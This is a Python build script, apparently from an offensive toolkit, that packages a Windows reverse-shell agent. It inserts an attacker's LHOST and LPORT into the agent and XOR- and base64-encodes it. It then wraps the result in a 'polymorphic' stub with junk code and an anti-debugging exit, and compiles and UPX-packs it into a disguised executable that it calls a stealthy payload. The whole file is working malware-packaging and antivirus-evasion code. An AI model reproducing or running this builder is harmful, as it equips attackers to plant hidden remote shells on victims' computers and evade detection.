# build/packager.py

import os
import random
import string
import subprocess
import base64
import time
import argparse

# 📦 Import config globale (fallback si .env pas encore chargé)
try:
    from core.config import LHOST as CONFIG_LHOST, LPORT as CONFIG_LPORT
except:
    CONFIG_LHOST, CONFIG_LPORT = "127.0.0.1", 4444

# 📁 Chemins
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
AGENT_FILE = os.path.join(BASE_DIR, "agents", "windows", "agent_win.py")
WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
ICON_DEFAULT = os.path.join(BASE_DIR, "assets", "win_ico.ico")
UPX_PATH = r"C:\\Tools\\upx-5.0.2-win64\\upx.exe"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ⚙️ Paramètres
XOR_KEY = 13
RANDOM_DELAY = random.randint(3, 12)

# 🔧 Utilitaires
def random_string(length=10):
    return random.choice(string.ascii_letters) + ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))

def xor_encrypt(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def polymorphic_wrapper(template: str) -> str:
    junk = "\n".join([f"{random_string(5)} = '{random_string(6)}'" for _ in range(10)])
    anti_dbg = "import sys\nif sys.gettrace(): exit()\n"
    return anti_dbg + "\n" + junk + "\n" + template

def inject_wrapper(encoded_payload: str, xor_key: int):
    with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
        template = f.read()
    wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
    wrapper_final = wrapper_final.replace("XOR_KEY = 13", f"XOR_KEY = {xor_key}")
    wrapper_final = polymorphic_wrapper(wrapper_final)
    with open(WRAPPER_OUTPUT, "w", encoding="utf-8") as f:
        f.write(wrapper_final)
    print("[✔] Wrapper injecté avec polymorphisme et protections.")

def compile_exe(output_name="payload_windows.exe", icon_path=None, compress=True):
    cmd = [
        "pyinstaller",
        "--noconfirm",
        "--onefile",
        "--clean",
        "--name", output_name.replace(".exe", ""),
        "--distpath", OUTPUT_DIR,
        WRAPPER_OUTPUT
    ]
    if icon_path and os.path.exists(icon_path):
        cmd += ["--icon", icon_path]
        print(f"[✔] Icône utilisée : {icon_path}")
    else:
        print("[!] Icône manquante, compilation sans icône.")

    print("[*] Compilation avec PyInstaller...")
    subprocess.run(cmd, check=True)

    exe_path = os.path.join(OUTPUT_DIR, output_name)
    if compress and os.path.exists(exe_path):
        try:
            subprocess.run([UPX_PATH, "--best", "--lzma", "--force", exe_path], check=True)
            print("[✔] Compression UPX terminée.")
        except subprocess.CalledProcessError as e:
            print(f"[❌] Erreur UPX : {e}")
    print(f"[✔] Payload final : {exe_path}")

# 🚀 Main
def main():
    parser = argparse.ArgumentParser(description="Packager de payload Windows furtif")
    parser.add_argument("--platform", choices=["windows"], default="windows", help="Plateforme cible")
    parser.add_argument("--lhost", help="Adresse IP attaquant (LHOST)")
    parser.add_argument("--lport", type=int, help="Port reverse shell (LPORT)")
    parser.add_argument("--icon", help="Icône du payload")
    args = parser.parse_args()

    lhost = args.lhost or CONFIG_LHOST
    lport = args.lport or CONFIG_LPORT
    icon_path = args.icon or ICON_DEFAULT

    print(f"[*] Délai aléatoire (camouflage) : {RANDOM_DELAY}s")
    time.sleep(RANDOM_DELAY)

    print("[*] Lecture de l'agent...")
    with open(AGENT_FILE, "r", encoding="utf-8") as f:
        code = f.read()

    code = code.replace("LHOST_PLACEHOLDER", f'"{lhost}"')
    code = code.replace("LPORT_PLACEHOLDER", f"{lport}")
    print(f"[✔] Remplacement : LHOST={lhost}, LPORT={lport}")

    print("[*] Chiffrement XOR + base64...")
    agent_bytes = code.encode("utf-8")
    encrypted_bytes = xor_encrypt(agent_bytes, XOR_KEY)
    encoded = base64.b64encode(encrypted_bytes).decode("utf-8")

    print("[*] Injection du wrapper polymorphe...")
    inject_wrapper(encoded, XOR_KEY)

    print("[*] Compilation...")
    compile_exe(icon_path=icon_path)

    print("[✔] Payload généré dans : build/output/")

if __name__ == "__main__":
    main()
